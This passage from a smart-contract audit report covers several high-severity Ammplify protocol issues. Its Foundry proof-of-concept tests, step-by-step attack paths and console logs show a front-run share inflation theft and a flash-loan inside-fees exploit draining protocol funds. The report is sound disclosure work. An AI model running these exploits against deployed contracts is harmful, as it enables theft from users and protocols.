(e.g., 1 hour), chargeTrueFeeRate computes takerRateX64 = timeDiff * APY without dividing by 365 days.\r\nFee computation multiplies borrow principal by an enormous effective rate (> 1x of principal for small timeDiff), resulting in massive fees.\r\nUpon closing the taker position, the borrower is overcharged by orders of magnitude.\r\nImpact\r\nBorrowers pay fees that are larger by ~31,536,000x than intended, resulting in catastrophic overcharging and potential total loss of borrower funds for even brief borrow durations.\r\n\r\nPoC\r\n// SPDX-License-Identifier: UNLICENSED  \r\npragma solidity ^0.8.27;  \r\n  \r\nimport { console } from \"forge-std/console.sol\";  \r\nimport { UniswapV3Pool } from \"v3-core/UniswapV3Pool.sol\";  \r\nimport { TickMath } from \"v3-core/libraries/TickMath.sol\";  \r\nimport { AmmplifyAdminRights } from \"../../src/facets/Admin.sol\";  \r\n  \r\nimport { MultiSetupTest } from \"../MultiSetup.u.sol\";  \r\n  \r\nimport { PoolInfo } from \"../../src/Pool.sol\";  \r\nimport { LiqType } from \"../../src/walkers/Liq.sol\";  \r\nimport { TreeTickLib } from \"../../src/tree/Tick.sol\";  \r\nimport { RouteImpl, Route } from \"../../src/tree/Route.sol\";  \r\nimport { KeyImpl, Key } from \"../../src/tree/Key.sol\";  \r\n  \r\nimport { MockERC20 } from \"../mocks/MockERC20.sol\";  \r\n  \r\n/// @dev The minimum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MIN_TICK)  \r\nuint160 constant MIN_SQRT_RATIO = 4295128739;  \r\n/// @dev The maximum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MAX_TICK)  \r\nuint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;  \r\n  \r\ncontract AuditPoCTest is MultiSetupTest {  \r\n    UniswapV3Pool public pool;  \r\n  \r\n    address public poolAddr;  \r\n    int24 public lowTick;  \r\n    int24 public highTick;  \r\n  \r\n    PoolInfo public poolInfo;  \r\n  \r\n  \r\n    function setUp() public {  \r\n        _newDiamond();  \r\n        (, address _pool, address _token0, address _token1) = setUpPool();  \r\n  \r\n        token0 = MockERC20(_token0);  \r\n        token1 = MockERC20(_token1);  \r\n        pool = UniswapV3Pool(_pool);  \r\n  \r\n        poolAddr = _pool;  \r\n        poolInfo = viewFacet.getPoolInfo(poolAddr);  \r\n  \r\n        _createPoolVaults(poolAddr);  \r\n    }  \r\n  \r\n    function test_Invalid_Fee_Rate_PoC() public {  \r\n        // Pool's fee is 3000 bps, tick spacing is 60  \r\n        // 887272 / 60 = 14787.866, nearest power of two is 8192  \r\n        // Tick spacing 0 = tree index 8192  \r\n        // Tick spacing 60 = tree index 8192  \r\n        // etc  \r\n  \r\n        // Grant Taker Rights  \r\n        address taker = makeAddr(\"taker\");  \r\n        adminFacet.submitRights(taker, AmmplifyAdminRights.TAKER, true);  \r\n        vm.warp(block.timestamp + 3 days);  \r\n        adminFacet.acceptRights();  \r\n  \r\n        // Mint some tokens for taker  \r\n        token0.mint(taker, 100e18);  \r\n        token1.mint(taker, 100e18);  \r\n        token0.approve(address(takerFacet), type(uint256).max);  \r\n        token1.approve(address(takerFacet), type(uint256).max);  \r\n  \r\n  \r\n        // Add liquidity between [8192 + 0, 8192 + 2) tree index  \r\n        bytes memory rftData = \"\";  \r\n        lowTick = 60 * 0;  \r\n        highTick = 60 * 2;  \r\n  \r\n        uint256 assetId = makerFacet.newMaker(  \r\n            address(this),  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            100e18,  \r\n            false,  \r\n            MIN_SQRT_RATIO,  \r\n            MAX_SQRT_RATIO,  \r\n            rftData  \r\n        );  \r\n          \r\n        // Taker takes the liquidity  \r\n        vm.prank(taker);  \r\n        uint256 takerAssetId = takerFacet.newTaker(  \r\n            taker,  \r\n            poolAddr,  \r\n            [lowTick, highTick],  \r\n            50e18,  \r\n            [0, 1],  \r\n            [MIN_SQRT_RATIO, MAX_SQRT_RATIO],  \r\n            MIN_SQRT_RATIO,  \r\n            rftData  \r\n        );  \r\n  \r\n        uint256 taker0BalBefore = token0.balanceOf(taker);  \r\n        uint256 taker1BalBefore = token1.balanceOf(taker);  \r\n  \r\n        // 10 seconds pass  \r\n        vm.warp(vm.getBlockTimestamp() + 3600 seconds);  \r\n  \r\n        // Taker removes taker position  \r\n        vm.prank(taker);  \r\n        takerFacet.removeTaker(takerAssetId, MIN_SQRT_RATIO, MAX_SQRT_RATIO, rftData);  \r\n  \r\n        uint256 taker0BalAfter = token0.balanceOf(taker);  \r\n        uint256 taker1BalAfter = token1.balanceOf(taker);  \r\n  \r\n        console.log(\"taker0Bal\", taker0BalBefore, taker0BalAfter);  \r\n        console.log(\"taker1Bal\", taker1BalBefore, taker1BalAfter);  \r\n        console.log(\"taker0Debt\", taker0BalBefore - taker0BalAfter);  \r\n        console.log(\"taker1Debt\", taker1BalBefore - taker1BalAfter);  \r\n    }  \r\n}  \r\nLogs from the PoC(Some logs are added to the codebase to better demonstrate the issue):\r\n\r\nLogs:  \r\n  RateConfig invAlphaX128 102084710076281535261119195933814292480  \r\n  RateConfig betaX64 14757395258967642112  \r\n  RateConfig maxUtilX64 22136092888451461120  \r\n  RateConfig maxRateX64 17524406870024073216  \r\n  timeDiff 3600  \r\n  totalTLiq 100000000000000000000  \r\n  totalMLiq 200000000000000000000  \r\n  takerRateX64 Per Sec 4216398645419327111  \r\n  tLiqPrefix 0  \r\n  totalXBorrows Prefix 0  \r\n  totalYBorrows Prefix 0  \r\n  colXPaid 122868321103496876201  \r\n  colYPaid 123607710009953542987  \r\n  totalXBorrows 149319140229944084  \r\n  totalYBorrows 150217703137096283  \r\n  --------------------------------  \r\n  taker0Bal 99999999999999999999 38565839448251561898  \r\n  taker1Bal 100000000000000000000 38196144995023228506  \r\n  taker0Debt 61434160551748438101  \r\n  taker1Debt 61803855004976771494  \r\nThe test demonstrates:\r\n\r\ntakerRateX64 Per Second is 4216398645419327111 which is around 0.22\r\n3600 seconds has passed, so total taker rate would be 792\r\nThe taker pays 61.4 Token0 and 61.8 Token1 as debt, only in 3600 seconds\r\nMitigation\r\nDivide by seconds per year when converting APY to per-second rate. A minimal, precise fix is to use FullMath.mulDiv to avoid overflow and preserve precision:\r\n\r\n--- a/src/walkers/Fee.sol  \r\n+++ b/src/walkers/Fee.sol  \r\n@@  \r\n-        uint256 timeDiff = uint128(block.timestamp) - data.timestamp; // Convert to 256 for next mult  \r\n-        uint256 takerRateX64 = timeDiff * data.fees.rateConfig.calculateRateX64(uint64((totalTLiq << 64) / totalMLiq));  \r\n+        uint256 timeDiff = uint128(block.timestamp) - data.timestamp; // seconds  \r\n+        uint256 takerRateX64 = FullMath.mulDiv(  \r\n+            timeDiff,  \r\n+            data.fees.rateConfig.calculateRateX64(uint64((totalTLiq << 64) / totalMLiq)),  \r\n+            365 days  \r\n+        );  \r\nThis converts the annual rate into an accurate per-second rate before scaling by elapsed time, restoring correct fee accrual.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/40\r\n\r\nIssue H-6: User can lose all funds when creating or increasing compounded Maker position due to share inflation first deposit attack in any segment of the user's range\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/417\r\n\r\nFound by\r\nHeckerTrieuTien, OxNoble, panprog\r\n\r\nSummary\r\nEach segment in the Ammplify protocol functions as vault for compounded Makers. This makes the classic first deposit share inflation attack possible for any range which doesn't have liquidity yet:\r\n\r\nUser wants to deposit liquidity into some range\r\nThere is no Ammplify Maker liquidity in some segment of the range (or all range)\r\nAttacker front-runs the deposit with minimum deposit, donates to uniswap liquidity range to increase liquidity share price\r\nUser deposit proceeds, taking necessary amounts of token0 / token1 from the user, but minting user 0 liquidity shares due to rounding (liquidity owed to user is less than 1 and thus rounded down). Uniswap liquidity itself is still minted, but it now belongs to the \"vault\" (attacker)\r\nAs a result, attacker steals all the deposit of the user with user getting 0 liquidity shares for his assets, losing all deposited funds.\r\n\r\nMoreover, the attack is more severe compared to traditional vault, because there are a lot of different segments in the Ammplify liquidity and each of them can be used to steal first deposit funds separately from the other segments.\r\n\r\nNote, that there is some protection by enforcing minimum target liquidity. However, it is not effective and can be bypassed, because it targets liquidity itself, not liquidity shares. This means that after depositing minimum liquidity and doing donation to the pool range, the liquidity share price increases by orders of magnitude. Adjusting maker position will re-target the liquidity, reducing liquidity shares down to 1 (for example: if liquidity share price = 1e10, a target liquidity of 1e10, which passes minimum liquidity check, sets target liquidity shares to 1). After that another donation can make liquidity share price arbitrarily large: a donation of user's deposit amount + 1 wei is enough to have user's liquidity shares round down to 0 to steal his deposit.\r\n\r\nRoot Cause\r\nRounding down share price minted to user (compounding liquidity can be donated to inflate liquidity share price):\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L260-L263\r\n\r\nMinimum target liquidity is enforced, while minimum liquidity shares are not enforced:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L31\r\n\r\nInternal Pre-conditions\r\n0 liquidity in any segment where liquidity being deposited by user will be minted.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nAttacker spots the user's transaction to deposit compounded maker liquidity into a range with 0 current liquidity (for example, 300e18 liquidity) and front-runs this deposit with the following transaction:\r\n\r\nAttacker deposits minimum compounded maker liquidity in the same range: for example, 1e6\r\nAttacker donates to uniswap pool in the range (if necessary, moves the current price inside the range, then uses pool.flash(0,0) and sends whatever amount of tokens he wants to donate): for example, 1e18 of each token\r\nAt this point the liquidity share price will be inflated: in the example, to 33e13 (full liquidity of attacker is now 33e13 * 1e6 = 330e18)\r\nAttacker adjusts his maker position to slightly above current share price: 40e13. His position (and the range node) has now 1 liquidity share.\r\nAttacker donates the amount of tokens which the user is going to deposit: 1e18 of each token\r\nShare price increases to 330e18\r\nNow attacker lets the user's transaction proceed\r\n\r\nNode liquidity is increased by 300e18, but user is minted 0 liquidity shares, because liquidity of 300e18 is below 1 liquidity share which is worth 330e18\r\nLiquidity share price increases to 630e18 (because there is still 1 liquidity share in the range, and extra 300e18 liquidity was minted along with 0 shares)\r\nAttacker can now close his position to receive all user's deposited liquidity, stealing it from the user\r\nImpact\r\nAll funds can be stolen from the user depositing into segment with 0 liquidity\r\n\r\nProof of concept\r\nAdd this test to Maker.t.sol:\r\n\r\n    function uniswapV3FlashCallback(  \r\n        uint256 fee0,  \r\n        uint256 fee1,  \r\n        bytes calldata data  \r\n    ) external {  \r\n        token0.transfer(msg.sender, 1e18+1);  \r\n        token1.transfer(msg.sender, 1e18+1);  \r\n    }  \r\n  \r\n    function testFirstDepositorDrain() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        address victim = makeAddr(\"victimUser\");  \r\n        vm.label(victim, \"victimUser\");  \r\n  \r\n        lowTick = 600;  \r\n        highTick = 720;  \r\n  \r\n        // set current price to the middle of the interval  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(630));  \r\n  \r\n        uint256 assetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            1e6, // minimum liquidity  \r\n            true, // compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // donate some amount to compound liquidity  \r\n        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, \"\");  \r\n  \r\n        // reduce liquidity shares  \r\n        makerFacet.adjustMaker(recipient, assetId, 4e14, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n  \r\n        // donate again  \r\n        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, \"\");  \r\n  \r\n        // mint new user who should get 0 shares  \r\n        vm.startPrank(victim);  \r\n        MockERC20(token0).mint(victim, 2e18);  \r\n        MockERC20(token1).mint(victim, 2e18);  \r\n        uint balVictim0 = token0.balanceOf(victim);  \r\n        uint balVictim1 = token1.balanceOf(victim);  \r\n        console2.log(\"victim balance before: \", balVictim0, balVictim1);  \r\n        MockERC20(token0).approve(diamond, type(uint256).max);  \r\n        MockERC20(token1).approve(diamond, type(uint256).max);  \r\n        uint256 assetId2 = makerFacet.newMaker(  \r\n            victim,  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            300e18,  \r\n            true, // compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );          \r\n  \r\n        // now close victim position to see how much he gets back  \r\n        makerFacet.removeMaker(victim, assetId2, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n        vm.stopPrank();  \r\n  \r\n        uint balVictim0After = token0.balanceOf(victim);  \r\n        uint balVictim1After = token1.balanceOf(victim);  \r\n        console2.log(\"victim balance after: \", balVictim0After, balVictim1After);  \r\n        console2.log(\"victim balance loss: \", balVictim0 - balVictim0After, balVictim1 - balVictim1After);  \r\n    }  \r\nThe test output:\r\n\r\n  victim balance before:  2000000000000000000 2000000000000000000  \r\n  victim balance after:  694864162251284872 1535971421840461598  \r\n  victim balance loss:  1305135837748715128 464028578159538402  \r\nMitigation\r\nSome possible mitigations include:\r\n\r\n\"virtual\" balances added to all liquidity during calculations similar to openzeppelin's ERC4626 implementations (a dust loss is expected for the users who deposit and withdraw due to virtual balances, but it prevents large inflations of the share price)\r\nenforce minimum liquidity shares balance (along with liquidity) of the node and/or account's asset node\r\nIssue H-7: Maker.collectFees re-targets liquidity to original amount even if the maker position was adjusted, causing unexpected position change when the user expected to collect fees only.\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/421\r\n\r\nFound by\r\nPeter1992, SOPROBRO, Theseersec, anonymousjoe, panprog, samm-code, vtim\r\n\r\nSummary\r\nWhen Maker.collectFees is called, it simply re-targets the liquidity to the asset's original amount:\r\n\r\n        // We collect simply by targeting the original liq balance.  \r\n        Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, asset.liq);  \r\nThe issue is that asset.liq is set in newMaker, but is not modified in adjustMaker. The data is set to new target liquidity, but the asset node itself is never changed:\r\n\r\n        Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, targetLiq);  \r\nThis means that if the user has ever adjusted his position and later tries to collect fees, his position will be unexpectedly modified along with collecting fees. Unsuspecting users can thus lose funds. For example, if his position has unexpectedly increases due to fee collection, he might lose funds from impermanent loss before realizing the issue and reducing again.\r\n\r\nAdditionally, the Maker.collectFees function doesn't expect that the user might have to pay, so the order of settlement is:\r\n\r\n        PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n...  \r\n        RFTLib.settle(recipient, tokens, balances, rftData);  \r\nIf the user position is increased in this function, PoolWalker.settle will first mint a new uniswap position for the diamond, and only then the user will be charged with the amounts of tokens to mint it. Transaction might revert if diamond doesn't have enough funds (from takers collaterals).\r\n\r\nRoot Cause\r\nMaker.adjustMaker doesn't change asset's liquidity, which is used to re-target liquidity in Maker.collectFees:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L55-L68\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L142-L143\r\n\r\nInternal Pre-conditions\r\nUser adjusted his position before collecting fees.\r\nSecondary condition: user reduced position before collecting fees and diamond doesn't have enough funds to mint the liquidity equal to this change (from taker collateral and previously collected fees not yet claimed or compounded).\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nAlways happens by itself when internal pre-condition is met\r\n\r\nImpact\r\nUser position is unexpectedly increased or decreased when collectFees is called\r\nUser loses funds from either increased impermanent loss or decreased fees earned (from the time position changes until user finds out it has changed and adjusts it again)\r\nUnexpected behaviour of core functionality (collectFees)\r\nSecondary impact:\r\n\r\nIf user has decreased position before collecting fees, user's maker liquidity will increase in collectFees, and if diamond doesn't have enough tokens balance to mint this additional liquidity, the transaction will revert (core functionality not working in some cases). It can happen either for large user liquidity change, or if there is not too much taker collateral.\r\nNotes:\r\n\r\nSince the user doesn't expect his position to change when doing collectFees, it can take some time before this position change is discovered. This allows for the funds loss from, e.g., increased impermanent loss, to become significant. For example, if user reduced liquidity from 1000e18 to 10e18 and then collected fees, his position will be back to 1000e18 and additional impermanent loss after 1 hour can be 1e18, which is 10% funds loss from the position amount of 10e18.\r\nProof of concept\r\nAdd this test to Maker.t.sol:\r\n\r\n    // adjust maker position, then collect fees  \r\n    // instead of keeping liquidity, it will modify it back to original size  \r\n   function testAdjustMakerCollect() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // add funds to diamond so that it has some extra to mint before collecting from the user  \r\n        takerFacet.collateralize(recipient, address(token1), 1e20, \"\");  \r\n  \r\n        // current price above the range we'll work at  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(1000));  \r\n  \r\n        // Create maker  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            720,  \r\n            960,  \r\n            300e18,  \r\n            false, // non-compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // reduce maker  \r\n        makerFacet.adjustMaker(recipient, makerAssetId, 100e18, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n  \r\n        // collect maker  \r\n        // instead of keeping liquidity the same, it is increased  \r\n        makerFacet.collectFees(recipient, makerAssetId, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n  \r\n        (,,,,, uint128 liq) = viewFacet.getAssetInfo(makerAssetId);  \r\n        console2.log(\"Liquidity after collecting: \", liq);  \r\n    }  \r\nThe test creates new maker with 300e18 liquidity, reduces it to 100e18, the collects fees. After fees collection, liquidity is 300e18 instead of 100e18.\r\n\r\nConsole output from running the test:\r\n\r\n  Liquidity after collecting:  300000000000000000000  \r\nMitigation\r\nChange the asset.liq amount to target liquidity in Maker.adjustMaker.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/31\r\n\r\nIssue H-8: Incorrect inside fees calculation for uninitialized uniswap ticks causes positions funds being stuck in the contract and allows to steal all taker collateral and collected fees\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/422\r\n\r\nFound by\r\npanprog\r\n\r\nSummary\r\nPoolLib.getInsideFees calculates inside fees when current price is inside the position range as:\r\n\r\n        (, , uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128, , , , ) = poolContract.ticks(  \r\n            lowerTick  \r\n        );  \r\n        (, , uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128, , , , ) = poolContract.ticks(  \r\n            upperTick  \r\n        );  \r\n...  \r\n                uint256 feeGrowthGlobal0X128 = poolContract.feeGrowthGlobal0X128();  \r\n                uint256 feeGrowthGlobal1X128 = poolContract.feeGrowthGlobal1X128();  \r\n                feeGrowthInside0X128 = feeGrowthGlobal0X128 - lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;  \r\n                feeGrowthInside1X128 = feeGrowthGlobal1X128 - lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;  \r\nThe issue is that this code doesn't handle uninitialized ticks. poolContract.ticks returns correct lowerFeeGrowthOutside amounts only for initialized ticks. For uninitialized ticks it returns 0. This means that for uninitialized ticks the feeGrowthInside amounts will be equal to feeGrowthGlobal.\r\n\r\nExamples of impacts caused by this:\r\n\r\nIf maker position is created on uninitialized uniswap ticks while the current price is inside the position range, any further actions of this position will revert, with user funds in this position being stuck permanently\r\nAttacker can steal all diamon funds by collecting inflated fees\r\nRoot Cause\r\nUniswap pool's uninitialized ticks are not handled correctly, inflating inside fees for uninitialized ticks:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/Pool.sol#L124-L129\r\n\r\nInternal Pre-conditions\r\nFor funds stuck impact: user creates maker position in a range with 0 uniswap liquidity.\r\nFor stealing impact: taker taking liquidity in any range\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nUser funds permanently lost\r\nIf maker position is created on uninitialized uniswap ticks while the current price is inside the position range, any further actions of this position will revert:\r\n\r\nThe node's inside fees will be set to PoolLib.getInsideFees in liquidity walker. Since position is not yet minted, ticks are uninitialized and node's inside fees will be set to inflated amount (feeGrowthGlobal)\r\nLater, in the settle walker, the liquidity will be minted and ticks will be initialized to correct values. From this time, PoolLib.getInsideFees will return 0 for the same interval\r\nAny attempt to adjust this position will revert in liqudity walker (in the compound function called from liquidity up function):\r\n        (uint256 newFeeGrowthInside0X128, uint256 newFeeGrowthInside1X128) = PoolLib.getInsideFees(  \r\n            data.poolAddr,  \r\n            iter.lowTick,  \r\n            iter.highTick  \r\n        );  \r\n        uint256 feeDiffInside0X128 = newFeeGrowthInside0X128 - node.liq.feeGrowthInside0X128;  \r\n        uint256 feeDiffInside1X128 = newFeeGrowthInside1X128 - node.liq.feeGrowthInside1X128;  \r\nHere the inside fees will be 0 while node.liq.feeGrowthInside will be inflated value of feeGrowthGlobal. The subtraction will underflow. There will be no way to fix this, thus the position funds will be permanently stuck and unrecoverable to the user.\r\n\r\nStealing all funds\r\nWhen taker liquidity equals maker liquidity at some range, there will be 0 net liquidity (and possible uninitialized tick), while the fees are still claimable on the maker position. This allows to steal all funds in the diamond protocol (taker collateral and collected fees not yet claimed or compounded):\r\n\r\nAttacker prepares attack by ensuring feeGrowthGlobal value is very large (if it is not large already by itself). It's easy to do this by creating any liquidity internval with 1 liquidity, moving price inside the interval, doing flash loan to donate some funds which will increase feeGrowthGlobal.\r\nAttacker opens multiple maker liquidity positions (non-compounding) waiting for the taker to take any\r\nOnce the taker takes any of this liquidity (by any amount), attacker moves the current price outside position range and reduces maker liquidity to equal taker liquidity. This reduces uniswap liquidity in the interval to 0 and tick data is reset to 0\r\nAttacker moves the current price inside the position range and collects fees (by using adjustMaker with the same liquidity due to another issue). Since ticks are uninitialized, fees collection will incorrectly use inflated getInsideFees values (equal to large feeGrowthGlobal) as if it's the fees collected and since all liquidity belongs to attacker, will send these fees to user. This will send all diamond balance to attacker.\r\nThe same attack, but more complex, is possible on the other segments without liquidity, utilizing the liquidity borrowing between nodes.\r\n\r\nImpact\r\nUser funds permanently lost under internal pre-condition 1\r\nAttacker can steal all protocol funds (takers collateral and collected fees not yet claimed or compounded) with minimal conditions (internal pre-condition 2)\r\nProof of concept\r\nFunds stuck test. Add this test to Maker.t.sol:\r\n    function testInflatedInsideFeesRevert() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // current price inside the range we'll work at  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(840));  \r\n  \r\n        // create maker while current price is inside the price range  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            720,  \r\n            960,  \r\n            300e18,  \r\n            true,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // try to modify liquidity => it reverts due to incorrect inside fees  \r\n        makerFacet.adjustMaker(recipient, makerAssetId, 200e18, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n    }  \r\nFunds steal test. Add this test to Taker.t.sol:\r\n    function uniswapV3FlashCallback(  \r\n        uint256 fee0,  \r\n        uint256 fee1,  \r\n        bytes calldata data  \r\n    ) external {  \r\n        token0.transfer(msg.sender, 9998);  \r\n        token1.transfer(msg.sender, 9998);  \r\n    }  \r\n  \r\n    function testI4nflatedInsideFeesSteal() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // Collateralize before creating taker position  \r\n        _collateralizeTaker(recipient, liquidity);  \r\n  \r\n        // add tiny liquidity to grow feeGrowthGlobal faster  \r\n        addPoolLiq(0, 1200, 1260, 1);  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(1210));  \r\n  \r\n        // donate some amount to make feeGrowthGlobal0X128 and feeGrowthGlobal1X128 larger  \r\n        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, \"\");  \r\n  \r\n        // current price outside the range we'll work at  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(1000));  \r\n  \r\n        // First create a maker large enough to borrow from.  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            720,  \r\n            960,  \r\n            300e18,  \r\n            false,  \r\n            sqrtPriceLimitsX96[0],  \r\n            sqrtPriceLimitsX96[1],  \r\n            rftData  \r\n        );  \r\n  \r\n        ticks[0] = 720;  \r\n        ticks[1] = 960;  \r\n  \r\n        // taker takes some of the liquidity (while still outside the range)  \r\n        uint256 takerAssetId = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            100e18,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            79228162514264337593543950336, // sqrt price at tick 840  \r\n            rftData  \r\n        );  \r\n  \r\n        // reduce uniswap liquidity at the range to 0 (mLiq = 100e18, tLiq = 100e18)  \r\n        // this resets outside liquidity at ticks to 0  \r\n        makerFacet.adjustMaker(recipient, makerAssetId, 100e18, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n  \r\n        // move price inside the range  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(840));  \r\n  \r\n        // collect fees (via adjustMaker to overcome collectFees bug)  \r\n        // due to inflated inside fees when uniswap liquidity == 0, it is possible  \r\n        uint balance0Before = token0.balanceOf(address(this));  \r\n        uint balance1Before = token1.balanceOf(address(this));  \r\n        makerFacet.adjustMaker(recipient, makerAssetId, 100e18, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n        //makerFacet.collectFees(recipient, makerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n  \r\n        console.log(\"fees0 collected: \", token0.balanceOf(address(this)) - balance0Before);  \r\n        console.log(\"fees1 collected: \", token1.balanceOf(address(this)) - balance1Before);  \r\n        console.log(\"diamond balance0: \", token0.balanceOf(diamond));  \r\n        console.log(\"diamond balance1: \", token1.balanceOf(diamond));  \r\n    }  \r\nConsole output from running the test:\r\n\r\n  fees0 collected:  999900005146770924721569  \r\n  fees1 collected:  999900018605825853414941  \r\n  diamond balance0:  99994853229075278431  \r\n  diamond balance1:  99981394174146585059  \r\nMitigation\r\nHandle uninitialized ticks correctly (when either tick is uninitialized, return 0 for inside fees). Be sure to also reset node's inside fees to 0 whenever uniswap's tick is reset. This is quite tricky to do correctly, because:\r\n\r\nthere can be non-Ammplify uniswap liquidity, in which case even if ammplify's liquidity is 0, tick might still be initialized\r\nwhen there is taker liquidity, there can be multiple maker liquidity positions in the range, each with its own stored inside fees. If the node's inside fees are reset to 0, these position's fees will become incorrect. There are multiple ways to solve this. For example, introduce \"base inside fees\", where total inside fees = base inside fees + PoolLib.getInsideFees. Whenever node's inside fees are reset to 0, base inside fees are incremented by the PoolLib.getInsideFees value before the reset.\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/32\r\n\r\nIssue H-9: Liquidity borrowed from or repaid to parent nodes is not always minted or burned in the uniswap pool, breaking up accounting and allowing to steal all protocol funds\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/424\r\n\r\nFound by\r\nanonymousjoe, blockace, panprog\r\n\r\nSummary\r\nWhen there is not enough liquidity in the node, it borrows liquidity from the parent. Since parent's liquidity equals liquidity of both children, borrowing liquidity increases the liquidity both of the current node and its sibling. This is done in solveLiq:\r\n\r\n            // We need to borrow liquidity from our parent node.  \r\n            Node storage sibling = data.node(iter.key.sibling());  \r\n            Node storage parent = data.node(iter.key.parent());  \r\n            int128 borrow = -netLiq;  \r\n            if (borrow < int128(data.liq.compoundThreshold)) {  \r\n                // We borrow at least this amount.  \r\n                borrow = int128(data.liq.compoundThreshold);  \r\n            }  \r\n            parent.liq.preLend += borrow;  \r\n            parent.liq.dirty = true;  \r\n            node.liq.borrowed += uint128(borrow);  \r\n            node.liq.dirty = true;  \r\n            sibling.liq.preBorrow += borrow;  \r\n            sibling.liq.dirty = true;  \r\nNotice, that sibling's liquidity is not actually modified, only preBorrow changes, which doesn't influence net() liquidity calculation. Moreover, in many cases siblings are not included in the route, meaning that in the settle walker, where uniswap pool liquidity is minted/burned, these siblings are not traversed and so the corresponding uniswap liquidity is not minted/burned. This leads to incorrect accounting and incorrect portfolio of uniswap positions in the Ammplify contract: any price changes are calculated as if the contract holds corresponding positions, while contract doesn't actually hold them.\r\n\r\nMoreover, this issue can be used by any malicious user to manipulate pool prices and steal all diamond funds (which includes all Takers collateral and collected fees not yet claimed or compounded).\r\n\r\nTo demonstrate the issue, here is the example of the route when modifying position in the [720..960] interval. These are the nodes visited by all walkers (when traveling up, as liquidity and settlement is done on the way up):\r\n720..960\r\n480..960\r\n0..960\r\n0..1920\r\n0..3840\r\n...\r\n\r\nIf the node [720..960] doesn't have enough liquidity, the liquidity is borrowed from the [480..960] node, and is given to 2 nodes: [480..720] and [720..960]. But since node [480..720] is not in the route, uniswap liquidity is not minted for it.\r\n\r\nRoot Cause\r\nWhen liquidity is borrowed, it's borrowed both for current node and its sibling, which might not be part of the settlement route:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L398-L399\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L413-L414\r\n\r\nInternal 